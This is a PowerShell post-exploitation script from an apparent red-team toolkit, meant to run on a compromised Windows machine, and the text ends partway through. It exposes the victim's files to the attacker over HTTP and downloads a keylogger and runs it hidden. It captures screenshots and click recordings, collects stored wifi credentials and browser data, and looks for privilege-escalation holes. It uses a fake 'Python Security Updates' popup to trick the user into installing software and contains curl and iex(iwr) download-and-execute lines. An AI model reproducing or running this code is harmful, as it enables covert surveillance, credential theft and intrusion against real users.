<#
.SYNOPSIS
   cmdlet to read/browse/download files from compromised target machine (windows).

   Author: r00t-3xp10it (SSA RedTeam @2020)
   Tested Under: Windows 10 - Build 18363
   Required Dependencies: python (http.server)
   Optional Dependencies: Curl|BitsTransfer
   PS cmdlet Dev version: v1.18

.DESCRIPTION
   This cmdlet has written to assist venom amsi evasion reverse tcp shell's (agents)
   with the ability to download files from target machine. It uses social engineering
   to trick target user into installing Python-3.9.0.exe as a python security update
   (if target user does not have python installed). This cmdlet also has the ability
   to capture Screenshots of MouseClicks [<-SPsr>] and browser enumeration [<-SEnum>]
   The follow 4 steps describes how to use webserver.ps1 on venom reverse tcp shell(s)

   1Âº - Place this cmdlet in attacker apache2 webroot
        cp webserver.ps1 /var/www/html/webserver.ps1

   2Âº - Upload webserver using the reverse tcp shell prompt
        cmd /c curl http://LHOST/webserver.ps1 -o %tmp%\webserver.ps1

   3Âº - Remote execute webserver using the reverse tcp shell prompt
        powershell -W 1 -File "$Env:TMP\webserver.ps1" -SForce 3 -SEnum Verbose

   4Âº - In attacker PC access 'http://RHOST:8086/' (web browser) to read/browse/download files.

.NOTES
   If executed with administrator privileges then this cmdlet add's
   one firewall rule that allow server silent connections. IF the shell
   does not have admin privs then 'ComputerDefaults.exe' EOP will be used
   to add the firewall rule to prevent 'incomming connections' warning.

   If executed without administrator privileges then this cmdlet
   its limmited to directory ACL permissions (R)(W)(F) attributes.
   NOTE: 'Get-Acl' powershell cmdlet displays directory attributes.

.EXAMPLE
   PS C:\> Get-Help .\webserver.ps1 -full
   Access This cmdlet Comment_Based_Help

.EXAMPLE
   PS C:\> .\webserver.ps1
   Spawn webserver in '$Env:UserProfile' directory on port 8086

.EXAMPLE
   PS C:\> .\webserver.ps1 -SPath "$Env:TMP" -SPort 8111
   Spawn webserver in the sellected directory on port 8111

.EXAMPLE
   PS C:\> .\webserver.ps1 -SPath "$Env:TMP" -SBind 192.168.1.72
   Spawn webserver in the sellected directory and bind to ip addr

.EXAMPLE
   PS C:\> .\webserver.ps1 -SForce 10 -STime 30
   force remote user to execute the python windows installer
   (10 attempts) and use 30 Sec delay between install attempts.
   'Its the syntax that gives us more guarantees of success'.

.EXAMPLE
   PS C:\> .\webserver.ps1 -SRec 5 -SRDelay 2
   Capture 5 desktop screenshots with 2 seconds of delay
   between each capture. before executing the @webserver.

.EXAMPLE
   PS C:\> .\webserver.ps1 -SPsr 8
   Capture Screenshots of MouseClicks for 8 seconds
   And store the capture under '$Env:TMP' remote directory
   'The minimum capture time its 8 seconds and 100 screenshots max'.

.EXAMPLE
   PS C:\> .\webserver.ps1 -Keylogger Start
   Download/Execute void.exe in child process
   to be abble to capture remote host keystrokes.

.EXAMPLE
   PS C:\> .\webserver.ps1 -Keylogger Stop
   Stop keylogger by is process FileName identifier
   and  delete keylogger and all respective files/logs
   This parameter can NOT be used together with other parameters
   because after completing is task (Stop keylogger proc) it exits.

.EXAMPLE
   PS C:\> .\webserver.ps1 -SEnum True
   Remote Host Web Browser Enumeration, DNS Records, DHCP
   User-Agent, Default Browser, TCP Headers, MainWindowTitle
   Wifi Stored credentials (ZIP archive), Anti-Virus status.

   PS C:\> .\webserver.ps1 -SEnum Verbose
   @webserver agressive (verbose) enumeration module

.EXAMPLE
   PS C:\> .\webserver.ps1 -Sessions List
   Enumerate active @webserver sessions.
   [Id][StartTime][Bind][Port][Directory]

.EXAMPLE
   PS C:\> .\webserver.ps1 -Sessions 2345
   Enumerate active @webserver sessions AND
   Kills the session by is PID identifier  
   This parameter can NOT be used together with other parameters
   because after completing is task (List sessions) it exits.

.EXAMPLE
   PS C:\> .\webserver.ps1 -SKill 2
   Kill ALL python (webserver) remote process in 'xx' seconds.
   This parameter can NOT be used together with other parameters
   because after completing is task (terminate server) it exits.

.EXAMPLE
   PS C:\> .\webserver.ps1 -Download "192.168.1.73,CompDefaults.ps1"
   Downloads CompDefaults.ps1 from attacker apache2 (192.168.1.73)
   webroot into @webserver remote working directory. This parameter
   can NOT be used together with other parameters because after
   completing is task (Download file) it exits execution.

.EXAMPLE
   PS C:\> .\webserver.ps1 -EOP HOTFIXS
   PS C:\> .\webserver.ps1 -EOP ACL
   PS C:\> .\webserver.ps1 -EOP CVE
   PS C:\> .\webserver.ps1 -EOP ALL
   Find missing software patches for privilege escalation.

   Title      : TrackPopupMenu Win32k Null Point Dereference
   MSBulletin : MS14-058
   CVEID      : 2014-4113
   Link       : https://www.exploit-db.com/exploits/35101/
   VulnStatus : Appers Vulnerable

.INPUTS
   None. You cannot pipe objects into webserver.ps1

.OUTPUTS
   This cmdlet does not produce outputs if used -WindowStyle hidden parameter.

.LINK
    https://github.com/r00t-3xp10it/venom
    https://github.com/r00t-3xp10it/venom/tree/master/aux/webserver.ps1
    https://github.com/r00t-3xp10it/venom/wiki/CmdLine-&-Scripts-for-reverse-TCP-shell-addicts
    https://github.com/r00t-3xp10it/venom/wiki/cmdlet-to-download-files-from-compromised-target-machine
#>


## Non-Positional cmdlet named parameters
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$SPath="$Env:UserProfile",
   [string]$Keylogger="False",
   [string]$Sessions="False",
   [string]$Download="False",
   [string]$SEnum="False",
   [string]$EOP="False",
   [int]$SPort='8086',
   [int]$SRDelay='2',
   [int]$STime='26',
   [int]$SForce='0',
   [int]$SKill='0',
   [int]$SPsr='0',
   [int]$SRec='0',
   [string]$SBind
)

$HiddeMsgBox = $False
$CmdletVersion = "v1.18"
$Initial_Path = (pwd).Path
$Server_hostName = (hostname)
$Server_Working_Dir = "$SPath"
$Remote_Server_Port = "$SPort"
$IsArch64 = [Environment]::Is64BitOperatingSystem
If($IsArch64 -ieq $True){
   $BinName = "python-3.9.0-amd64.exe"
}Else{
   $BinName = "python-3.9.0.exe"
}

## Simple (SE) HTTP WebServer Banner
$host.UI.RawUI.WindowTitle = "@webserver $CmdletVersion {SSA@RedTeam}"
$Banner = @"

 :::  ===  === :::===== :::====  :::===  :::===== :::====  :::  === :::===== :::==== 
 :::  ===  === :::      :::  === :::     :::      :::  === :::  === :::      :::  ===
 ===  ===  === ======   =======   =====  ======   =======  ===  === ======   ======= 
  ===========  ===      ===  ===     === ===      === ===   ======  ===      === === 
   ==== ====   ======== =======  ======  ======== ===  ===    ==    ======== ===  ===
          Simple (SE) HTTP WebServer by:r00t-3xp10it {SSA@RedTeam} $CmdletVersion


"@;
Clear-Host;
Write-Host $Banner;


If($Download -ne "False"){
$ServerIP = $Download.split(',')[0] ## Extract server ip addr from -Download "string"
$FileName = $Download.split(',')[1] ## Extract the filename from -Download "string"
If($SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -or $Sessions -ne 'False' -or $Keylogger -ne 'False' -or $EOP -ne 'False'){
   write-host "[warning] -Download parameter can not be used together with other parameters .." -ForeGroundColor Yellow
   Start-Sleep -Seconds 1
}

   <#
   .SYNOPSIS
      Download files from apache2 (Curl|BitsTransfer)

   .NOTES
      File to Download must be stored in attacker apache2 webroot.
      Double quotes are mandatory in this parameter value inputs.
      Localhost connections (127.0.0.1) are not supported (obvious).

   .EXAMPLE
      PS C:\> .\webserver.ps1 -Download "192.168.1.73,CompDefaults.ps1"
      Downloads CompDefaults.ps1 from attacker apache2 (192.168.1.73)
      into @webserver remote working directory [< -SPath >] parameter.
   #>

   Write-Host "Downloading $FileName to $Initial_Path" -ForeGroundColor DarkGreen;Start-Sleep -Seconds 1
   If($ServerIP -Match '127.0.0.1'){## Localhost connections are not supported by this module
      Write-Host "[abort] 127.0.0.1 (localhost) connections are not supported." -ForeGroundColor Red -BackGroundColor Black
      Write-Host "";Start-Sleep -Seconds 1;exit ## exit @webserver
   }

   cmd /c curl -s http://$ServerIP/$FileName -o $FileName|Out-Null
   If(-not($LASTEXITCODE -eq 0)){## Download using BitsTransfer service insted of curl.exe
      Write-Host "[fail] to download $FileName using curl.exe service" -ForeGroundColor Red -BackgroundColor Black
      Start-Sleep -Milliseconds 300;Write-Host "Trying to download $FileName Using BitsTransfer (BITS)" -ForeGroundColor Yellow      
      Start-BitsTransfer -priority foreground -Source http://$ServerIP/$FileName -Destination $Initial_Path\$FileName -ErrorAction SilentlyContinue|Out-Null   
      If(-not($LASTEXITCODE -eq 0)){Write-Host "[fail] to download $FileName using BitsTransfer service" -ForeGroundColor Red -BackgroundColor Black;Start-Sleep -Seconds 1}
   }

   ## Make sure that file was successfuly downloaded
   If(-not([System.IO.File]::Exists("$Initial_Path\$FileName")) -or $FileName -ieq $Null){
      Write-Host "`n----------------------------------------------------------------" -ForeGroundColor DarkGreen
      Write-Host "syntax : .\webserver.ps1 -Download `"<Apache2-IP>,<FileName.ps1>`""
      Write-Host "example: .\webserver.ps1 -Download `"192.168.1.73,FileName.ps1`""
      Write-Host "----------------------------------------------------------------" -ForeGroundColor DarkGreen
      Write-Host "";Start-Sleep -Seconds 1;exit ## exit @webserver  
   }

   ## Check for downloaded file integrity
   If(-not($FileName -iMatch '[.exe]$')){## This test does not work on binary files (.exe)
      $Status = Get-Content -Path "$Initial_Path\$FileName" -EA SilentlyContinue
      If($Status -iMatch '^(<!DOCTYPE html)'){
         Write-Host "[abort] $FileName Download Corrupted (DOCTYPE html)" -ForeGroundColor Red -BackGroundColor Black
         Write-Host "";Start-Sleep -Seconds 1;exit ## exit @webserver
      }ElseIf($Status -iMatch '^(404)'){
         Write-Host "[abort] $FileName Not found in Remote Server (404)" -ForeGroundColor Red -BackGroundColor Black
         Write-Host "";Start-Sleep -Seconds 1;exit ## exit @webserver
      }ElseIf($Status -ieq $Null){
         Write-Host "[abort] $FileName `$null Content Detected (corrupted)" -ForeGroundColor Red -BackGroundColor Black
         Write-Host "";Start-Sleep -Seconds 1;exit ## exit @webserver
      }Else{
         ## File successfuly Downloaded
         $Success = $True
      }
   }

   ## Check for downloaded Binary integrity
   If($FileName -iMatch '[.exe]$'){## Binary file download detected
      $SizeDump = ((Get-Item "$Initial_Path\$FileName" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 80){## Make sure Curl|BitsTransfer download is not corrupted
         Write-Host "[abort] $FileName Length: $SizeDump/KB Integrity Corrupted" -ForeGroundColor Red -BackGroundColor Black
         Write-Host "";Start-Sleep -Seconds 1;exit ## exit @webserver
      }
   }

   ## Build Object-Table Display
   If(Test-Path -Path "$Initial_Path\$FileName"){
      Get-ChildItem -Path "$Initial_Path\$FileName" -EA SilentlyContinue|Select-Object Directory,Name,Exists,CreationTime > $Env:LOCALAPPDATA\download.log
      Get-Content -Path "$Env:LOCALAPPDATA\download.log";Remove-Item "$Env:LOCALAPPDATA\download.log" -Force
   }
   Write-Host "";Start-Sleep -Seconds 1 
   exit ## exit @webserver
}


If($SKill -gt 0){
$Count = 0 ## Loop counter 
If($SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -or $Sessions -ne 'False' -or $Keylogger -ne 'False' -or $EOP -ne 'False' -or $Download -ne 'False'){
   write-host "[warning] -SKill parameter can not be used together with other parameters .." -ForeGroundColor Yellow
   Start-Sleep -Seconds 1
}

   <#
   .SYNOPSIS
      Kill ALL python (@webserver) remote process(s) in 'xx' seconds

   .EXAMPLE
      PS C:\> .\webserver.ps1 -SKill 2
      Kill ALL python (@webserver) remote process(s) in 2 seconds
   #>

   ## Make sure python (@webserver) process is running on remote system
   write-host "`nKill @webserver python process(s) in $SKill seconds."  -ForeGroundColor DarkGreen
   Start-Sleep -Seconds 1;Write-Host "`nId  Process  Version  Pid   StopTime"
   Write-Host "--  -------  -------  ---   --------" -ForeGroundColor DarkGreen
   $ProcessPythonRunning = Get-Process|Select-Object ProcessName|Select-String python
   If($ProcessPythonRunning){
      $TablePid = Get-Process python -ErrorAction SilentlyContinue|Select-Object -ExpandProperty Id
      $TableName = Get-Process python -ErrorAction SilentlyContinue|Select-Object -ExpandProperty ProcessName|Select -Last 1
      $ServerVersion = Get-Process python -ErrorAction SilentlyContinue|Select-Object -ExpandProperty ProductVersion|Select -Last 1
      Start-Sleep -Seconds $SKill; # Kill remote python process after 'xx' seconds delay
      taskkill /F /IM python.exe|Out-Null
      If(-not($LASTEXITCODE -eq 0)){
         write-host "$LASTEXITCODE   fail to terminate python process(s)" -ForeGroundColor Red -BackgroundColor Black}
   }Else{
      write-host "$LASTEXITCODE   None active sessions found under $Server_hostName" -ForeGroundColor Red -BackgroundColor Black
   }

   ## Create data table for output
   foreach($KeyId in $TablePid){
      $Count++;$CloseTime = Get-Date -Format 'HH:mm:ss';Start-Sleep -Seconds 1
      Write-Host "$Count   $TableName   $ServerVersion    $KeyId  $CloseTime"
   }
   If(Test-Path "$Env:TMP\sessions.log"){Remove-Item $Env:TMP\sessions.log -Force}
   write-host "";Start-Sleep -Seconds 1
   exit ## exit @webserver
}


If($Sessions -ieq "List" -or $Sessions -Match '^\d+$'){
$Count = 0 ## Loop counter

If($SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -or $Keylogger -ne 'False' -or $EOP -ne 'False' -or $Download -ne 'False' -or $SKill -ne '0'){
   write-host "[warning] -Sessions parameter can not be used together with other parameters .." -ForeGroundColor Yellow
   Start-Sleep -Seconds 1
}

   <#
   .SYNOPSIS
      Enumerate active @webserver sessions
      OR: kills process by is PID identifier.

   .EXAMPLE
      PS C:\> .\webserver.ps1 -Sessions List
      Enumerate active @webserver sessions.
      [Id][StartTime][Bind][Port][Directory]

   .EXAMPLE
      PS C:\> .\webserver.ps1 -Sessions 2345
      Enumerate active @webserver sessions AND
      Kills the session by is PID identifier      
   #>

   ## Create Data Table for Output
   Write-Host "Active server sessions"  -ForeGroundColor DarkGreen
   Write-Host "`nId  Pid   StartTime  Bind          Port  Directory"
   Write-Host "--  ---   ---------  ----          ----  ---------" -ForeGroundColor DarkGreen
   If(Test-Path "$Env:TMP\sessions.log"){
      foreach($KeyId in Get-Content "$Env:TMP\sessions.log"){
         $Count++;Start-Sleep -Milliseconds 700
         Write-Host "$Count   $KeyId"
      }
   }Else{
      write-host "$LASTEXITCODE   None active sessions found under $Server_hostName`n" -ForeGroundColor Red -BackgroundColor Black 
      exit ## exit @webserver
   }

   ## Kill Process by is PID number
   If($Sessions -Match '^\d+$'){
      Write-Host "`nKilling Process PID: $Sessions" -ForegroundColor DarkGreen
      $CheckIfPidExist = Get-Process python -ErrorAction SilentlyContinue|Select-Object -ExpandProperty Id
      If($CheckIfPidExist -Match "$Sessions"){
         cmd /c taskkill /F /PID $Sessions;Start-Sleep -Seconds 1
         Write-Host "`nCurrently active session process(s)" -ForegroundColor DarkGreen
         Write-Host "ProcessName                   PID  SessionName                Session MemUsage"
         cmd /c tasklist /NH|findstr /I "python"

         ## Delete session PID Number from sessions.log file
         # $GrabPidIdentifier = Get-Content "$Env:TMP\sessions.log"|findstr /C:"$Sessions"
         # $SessionPidDeletion = $GrabPidIdentifier[0,1,2,3] -Join ''
         ((Get-Content -Path "$Env:TMP\sessions.log" -Raw|Select-String "$Sessions") -Replace "$Sessions","STOP")|Set-Content -Path "$Env:TMP\sessions.log" -NoNewLine -Force
      }Else{
         Write-Host "[fail] PID: $Sessions Not found" -ForeGroundColor Red -BackgroundColor Black
      }
   }
   write-host "";Start-Sleep -Seconds 1
   exit ## exit @webserver
}


If($EOP -ieq "CVE" -or $EOP -ieq "ALL" -or $EOP -ieq "True" -or $EOP -ieq "HOTFIXS"){
If($SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -or $Sessions -ne 'False' -or $Keylogger -ne 'False' -or $Download -ne 'False' -or $SKill -ne '0'){
   write-host "[warning] -EOP parameter can not be used together with other parameters .." -ForeGroundColor Yellow
   Start-Sleep -Seconds 1
}

   <#
   .SYNOPSIS
      Author: @_RastaMouse|@r00t-3xp10it (sherlock.ps1 v1.3)
      Find missing software patchs for privilege escalation

   .NOTES
      This Module does not exploit any vulnerabitys found.
      It will 'report' and presents the exploit-db POC link

   .EXAMPLE
      PS C:\> .\webserver.ps1 -EOP HOTFIXS

   .EXAMPLE
      PS C:\> .\webserver.ps1 -EOP ACL

   .EXAMPLE
      PS C:\> .\webserver.ps1 -EOP CVE

   .EXAMPLE
      PS C:\> .\webserver.ps1 -EOP ALL

   .OUTPUTS
      Title      : TrackPopupMenu Win32k Null Point Dereference
      MSBulletin : MS14-058
      CVEID      : 2014-4113
      Link       : https://www.exploit-db.com/exploits/35101/
      VulnStatus : Appers Vulnerable
   #>

   ## Download Sherlock (@_RastaMouse) from my github repository
   # Remark: I add to port sherlock to my Git-Hub to be abble to fix the cmdlet 'ObjectNotFound' error display
   # when the file its not found, And to update the cmdlet (deprecated) with new 2020 EOP CVE's entrys
   ## Downloads sherlock.ps1 to disk using BitsTransfer service (BITS)
   Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/venom/master/aux/sherlock.ps1 -Destination $Env:TMP\sherlock.ps1 -ErrorAction SilentlyContinue|Out-Null
 
   ## Check for file download integrity (fail/corrupted downloads)
   $CheckInt = Get-Content -Path "$Env:TMP\sherlock.ps1" -EA SilentlyContinue
   $SizeDump = ((Get-Item -Path "$Env:TMP\sherlock.ps1" -EA SilentlyContinue).length/1KB)
   If(-not(Test-Path -Path "$Env:TMP\sherlock.ps1") -or $SizeDump -lt 16 -or $CheckInt -iMatch '^(<!DOCTYPE html)'){
      ## Fail to download Sherlock.ps1 using BitsTransfer OR the downloaded file is corrupted
      Write-Host "[abort] fail to download sherlock.ps1 using BitsTransfer (BITS)" -ForeGroundColor Red -BackGroundColor Black
      If(Test-Path -Path "$Env:TMP\sherlock.ps1"){Remove-Item -Path "$Env:TMP\sherlock.ps1" -Force}
      Start-Sleep -Seconds 1;exit ## exit @webserver
   }

   ## Import-Module (-Force reloads the module everytime)
   $SherlockPath = Test-Path -Path "$Env:TMP\sherlock.ps1" -EA SilentlyContinue
   If($SherlockPath -ieq "True" -and $SizeDump -gt 15){
      Import-Module -Name "$Env:TMP\sherlock.ps1" -Force
      If($EOP -ieq "ALL"){## Use ALL Sherlock EoP functions
         Use-AllModules
      }ElseIf($EOP -ieq "HOTFIXS"){## find missing KB patchs
         Get-HotFixs
      }ElseIf($EOP -ieq "ACL"){## find Unquoted service paths
         ## and search recursive for folders with Everyone:(F) permissions
         Get-Unquoted;Get-Paths
      }ElseIf($EOP -ieq "CVE"){## find missing CVE patchs
         Find-AllVulns
      }Else{## Default its to lunch only CVE tests
         Use-AllModules
      }
   }
   
   ## Delete sherlock script from remote system
   If(Test-Path -Path "$Env:TMP\sherlock.ps1"){Remove-Item -Path "$Env:TMP\sherlock.ps1" -Force}
   Write-Host "";exit ## exit @webserver
}


If($SRec -gt 0){
$Limmit = $SRec+1 ## The number of screenshots to be taken
If($SRDelay -lt '1'){$SRDelay = '1'} ## Screenshots delay time minimum value accepted

   <#
   .SYNOPSIS
      Capture remote desktop screenshot(s)

   .DESCRIPTION
      [<-SRec>] Parameter allow us to take desktop screenshots before
      continue with @webserver execution. The value set in [<-SRec>] parameter
      serve to count how many screenshots we want to capture before continue.

   .EXAMPLE
      PS C:\> .\webserver.ps1 -SRec 5 -SRDelay 2
      Capture 5 desktop screenshots with 2 seconds of delay
      between each capture. before executing the @webserver.
   #>

   ## Loop Function to take more than one screenshot.
   For ($num = 1 ; $num -le $SRec ; $num++){
      write-host "Screenshot $num" -ForeGroundColor Yellow

      $OutPutPath = "$Env:TMP"
      $Dep = -join (((48..57)+(65..90)+(97..122)) * 80 |Get-Random -Count 5 |%{[char]$_})
      $FileName = "$Env:TMP\SHot-"+"$Dep.png"
      If(-not(Test-Path "$OutPutPath")){New-Item $OutPutPath -ItemType Directory -Force}
      Add-Type -AssemblyName System.Windows.Forms
      Add-type -AssemblyName System.Drawing
      $ASLR = [System.Windows.Forms.SystemInformation]::VirtualScreen
      $Height = $ASLR.Height;$Width = $ASLR.Width
      $Top = $ASLR.Top;$Left = $ASLR.Left
      $Console = New-Object System.Drawing.Bitmap $Width, $Height
      $AMD = [System.Drawing.Graphics]::FromImage($Console)
      $AMD.CopyFromScreen($Left, $Top, 0, 0, $Console.Size)
      $Console.Save($FileName) 
      Write-Host "Saved to: $FileName"

      #iex(iwr("https://pastebin.com/raw/bqddWQcy")); ## Script.ps1 (pastebin) FileLess execution ..
      Start-Sleep -Seconds $SRDelay; ## 2 seconds delay between screenshots (default value)
   }
   Write-Host ""
}


If($SPsr -gt 0){
## Random FileName generation
$Rand = -join (((48..57)+(65..90)+(97..122)) * 80 |Get-Random -Count 6 |%{[char]$_})
$CaptureFile = "$Env:TMP\SHot-"+"$Rand.zip"
If($SPsr -lt '8'){$SPsr = '10'} # Set the minimum capture time value

   <#
   .SYNOPSIS
      Capture Screenshots of MouseClicks for 'xx' seconds

   .DESCRIPTION
      This script allow users to Capture target Screenshots of MouseClicks
      with the help of psr.exe native windows 10 (error report service) binary.
      'The capture will be stored under remote-host '$Env:TMP' directory'.
      'The minimum capture time its 8 seconds and 100 screenshots max'.

   .EXAMPLE
      PS C:\> .\webserver.ps1 -SPsr 8
      Capture Screenshots of MouseClicks for 8 seconds
      And store the capture under '$Env:TMP' remote directory.
   #>

   ## Make sure psr.exe (LolBin) exists on remote host
   If(Test-Path "$Env:WINDIR\System32\psr.exe"){
      write-host "Recording $Server_hostName activity for $SPsr seconds." -ForeGroundColor DarkGreen
      write-host "Capture: $CaptureFile" -ForeGroundColor Yellow;Start-Sleep -Seconds 2
      ## Start psr.exe (-WindowStyle hidden) process detach (orphan) from parent process
      Start-Process -WindowStyle hidden powershell -ArgumentList "psr.exe", "/start", "/output $CaptureFile", "/sc 1", "/maxsc 100", "/gui 0;", "Start-Sleep -Seconds $SPsr;", "psr.exe /stop" -ErrorAction SilentlyContinue|Out-Null
      If(-not($LASTEXITCODE -eq 0)){write-host "[abort] @webserver cant start psr.exe process" -ForeGroundColor Red -BackgroundColor Black;Start-Sleep -Seconds 2}
   }Else{
      ## PSR.exe (error report service) not found in current system ..
      write-host "[fail] Not found: $Env:WINDIR\System32\psr.exe" -ForeGroundColor Red -BackgroundColor Black
      Start-Sleep -Seconds 1
   }
}


If($Keylogger -ieq 'Start' -or $Keylogger -ieq 'Stop'){
$Timer = Get-Date -Format 'HH:mm:ss'

   <#
   .SYNOPSIS
      Capture remote host keystrokes ($Env:TMP)

   .EXAMPLE
      PS C:\> .\webserver.ps1 -Keylogger Start
      Download/Execute void.exe in child process
      to be abble to capture system keystrokes

   .EXAMPLE
      PS C:\> .\webserver.ps1 -Keylogger Stop
      Stop keylogger by is process FileName identifier
      and delete keylogger and all respective files/logs
   #>

   If($Keylogger -ieq 'Start'){## Download binary from venom\GitHub (RAW)
      write-host "Capture $Server_hostName keystrokes." -ForeGroundColor DarkGreen;Start-Sleep -Seconds 1
      cmd /c curl.exe -L -k -s https://raw.githubusercontent.com/r00t-3xp10it/venom/master/bin/void.zip -o %tmp%\void.zip -u SSARedTeam:s3cr3t

      ## Check for Failed/Corrupted downloads
      $SizeDump = ((Get-Item "$Env:TMP\void.zip" -EA SilentlyContinue).length/1KB)
      If(-not(Test-Path -Path "$Env:TMP\void.zip") -or $SizeDump -lt 36){## Fail to download void using curl.exe
         Write-Host "[fail] to download void.zip using curl.exe service" -ForeGroundColor Red -BackgroundColor Black
         Start-Sleep -Milliseconds 600;Write-Host "Trying to download void.zip Using BitsTransfer (BITS)" -ForeGroundColor Yellow      
         Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/venom/master/bin/void.zip -Destination $Env:TMP\void.zip -ErrorAction SilentlyContinue|Out-Null

         ## Check for Failed/Corrupted downloads
         $SizeDump = ((Get-Item "$Env:TMP\void.zip" -EA SilentlyContinue).length/1KB)
         If(-not(Test-Path -Path "$Env:TMP\void.zip") -or $SizeDump -lt 36){## Fail to download void.zip using BitsTransfer (BITS)
            Write-Host "[fail] to download void.zip using BitsTransfer service" -ForeGroundColor Red -BackgroundColor Black
            If(Test-Path -Path "$Env:TMP\void.zip" -EA SilentlyContinue){Remove-Item -Path "$Env:TMP\void.zip" -Force}
            Start-Sleep -Milliseconds 600;Write-Host "[abort] keylogger (void.exe) remote execution .." -ForeGroundColor Yellow
            Start-Sleep -Seconds 1;write-host ""       
         }
      }

      $SizeDump = ((Get-Item "$Env:TMP\void.zip" -EA SilentlyContinue).length/1KB)
      $KeyPath = Test-Path -Path "$Env:TMP\void.zip" -EA SilentlyContinue
      If($KeyPath -ieq "True" -and $SizeDump -gt 36){## Check for file integrity

         ## De-Compress Keylogger Archive files into $env:TMP remote directory
         Expand-Archive -Path "$Env:TMP\void.zip" -DestinationPath "$Env:TMP\void" -Force -ErrorAction SilentlyContinue|Out-Null
         Move-Item $Env:TMP\void\void.exe $Env:TMP\void.exe -Force -EA SilentlyContinue
         Remove-Item -Path "$Env:TMP\void" -Force -Recurse -EA SilentlyContinue
         Remove-Item -Path "$Env:TMP\void.zip" -Force

         ## Start void.exe in an orphan process
         $KeyLoggerTimer = Get-Date -Format 'HH:mm:ss'
         Start-Process -WindowStyle hidden -FilePath "$Env:TMP\void.exe" -ErrorAction SilentlyContinue|Out-Null
         Start-Sleep -Milliseconds 2600;$PIDS = Get-Process void -ErrorAction SilentlyContinue|Select-Object -ExpandProperty Id|Select -Last 1

            ## Create Data Table for output
            $mytable = New-Object System.Data.DataTable
            $mytable.Columns.Add("StartTime")|Out-Null
            $mytable.Columns.Add("ProcessName")|Out-Null
            $mytable.Columns.Add("PID")|Out-Null
            $mytable.Columns.Add("LogFile")|Out-Null
            $mytable.Rows.Add("$KeyLoggerTimer",
                              "void.exe",
                              "$PIDS",
                              "$Env:TMP\void.log")|Out-Null

         ## Display Data Table
         $mytable|Format-Table -AutoSize > $Env:TMP\KeyDump.log
         Get-Content -Path "$Env:TMP\KeyDump.log"
         Remove-Item -Path "$Env:TMP\KeyDump.log" -Force
      }
   }

   If($Keylogger -ieq 'Stop'){
      ## Dump captured keystrokes
      # Stops process and Delete files/logs
      Write-Host "Captured keystrokes"
      Write-Host "-------------------" -ForegroundColor DarkGreen
      If(Test-Path -Path "$Env:TMP\void.log"){
         $parsedata = Get-Content -Path "$Env:TMP\void.log"
         $Diplaydata = $parsedata  -replace "\[ENTER\]","`r`n" -replace "</time>","</time>`r`n" -replace "\[RIGHT\]","" -replace "\[BACKSPACE\]","" -replace "\[DOWN\]","" -replace "\[LEFT\]","" -replace "\[UP\]","" -replace "\[WIN KEY\]r","" -replace "\[CTRL\]v","" -replace "\[CTRL\]c","" -replace "ALT DIREITO2","@" -replace "ALT DIREITO",""
         Write-Host "$Diplaydata"
      };Write-Host ""
      write-host "Stoping keylogger process (void.exe)" -ForeGroundColor DarkGreen;Start-Sleep -Seconds 1
      $IDS = Get-Process void -ErrorAction SilentlyContinue|Select-Object -ExpandProperty Id|Select -Last 1

      If($IDS){## keylogger process found
         taskkill /F /IM void.exe|Out-Null
         If($? -ieq 'True'){## Check Last Command ErrorCode (LASTEXITCODE)
            write-host "Keylogger PID $IDS process successfuly stoped.`n"
         }Else{
            write-host "[fail] to terminate keylogger PID process" -ForeGroundColor Red -BackgroundColor Black
         }
      }Else{
         write-host "[fail] keylogger process PID not found" -ForeGroundColor Red -BackgroundColor Black
      }

      write-host ""
      ## Clean old keylogger files\logs
      Remove-Item -Path "$Env:TMP\void.log" -EA SilentlyContinue -Force
      Remove-Item -Path "$Env:TMP\void.exe" -EA SilentlyContinue -Force
      Start-Sleep -Milliseconds 600;exit ## exit @webserver
   }
}


$PythonVersion = cmd /c python --version
If(-not($PythonVersion) -or $PythonVersion -ieq $null){
   write-host "python not found, Downloading from python.org" -ForeGroundColor Red -BackgroundColor Black
   Start-Sleep -Seconds 1

   <#
   .SYNOPSIS
      Download/Install Python 3.9.0 => http.server (requirement)
      Author: @r00t-3xp10it (venom Social Engineering Function)

   .DESCRIPTION
      Checks target system architecture (x64 or x86) to download from Python
      oficial webpage the comrrespondent python 3.9.0 windows installer if
      target system does not have the python http.server module installed ..

   .NOTES
      This function uses the native (windows 10) curl.exe LolBin to
      download python-3.9.0.exe before remote execute the installer
   #>

   If(cmd /c curl.exe --version){ # <-- Unnecessary step? curl its native (windows 10) rigth?
      ## Download python windows installer and use social engineering to trick user to install it
      write-host "Downloading $BinName from python.org" -ForeGroundColor DarkGreen
      cmd /c curl.exe -L -k -s https://www.python.org/ftp/python/3.9.0/$BinName -o %tmp%\$BinName -u SSARedTeam:s3cr3t
      Write-Host "Remote Spawning Social Engineering MsgBox."
      powershell (NeW-ObjeCt -ComObjEct Wscript.Shell).Popup("Python Security Updates Available.`nDo you wish to Install them now?",15,"$BinName setup",4+48)|Out-Null
      $HiddeMsgBox = $True
      If(Test-Path "$Env:TMP\$BinName"){
         ## Execute python windows installer (Default = just one time)
         powershell Start-Process -FilePath "$Env:TMP\$BinName" -Wait
         If(Test-Path "$Env:TMP\$BinName"){Remove-Item "$Env:TMP\$BinName" -Force}
      }Else{
         $SForce = '2'
         ## Remote File: $Env:TMP\python-3.9.0.exe not found ..
         # Activate -SForce parameter to use powershell Start-BitsTransfer cmdlet insted of curl.exe
         Write-Host "[File] Not found: $Env:TMP\$BinName" -ForeGroundColor Red -BackgroundColor Black;Start-Sleep -Seconds 1
         Write-Host "[Auto] Activate : -SForce 2 parameter to use powershell Start-BitsTransfer" -ForeGroundColor Yellow;Start-Sleep -Seconds 2
      }
   }Else{
      $SForce = '2'
      ## LolBin downloader (curl) not found in current system.
      # Activate -SForce parameter to use powershell Start-BitsTransfer cmdlet insted of curl.exe
      Write-Host "[Appl] Not found: Curl downloder (LolBin)" -ForeGroundColor Red -BackgroundColor Black;Start-Sleep -Seconds 1
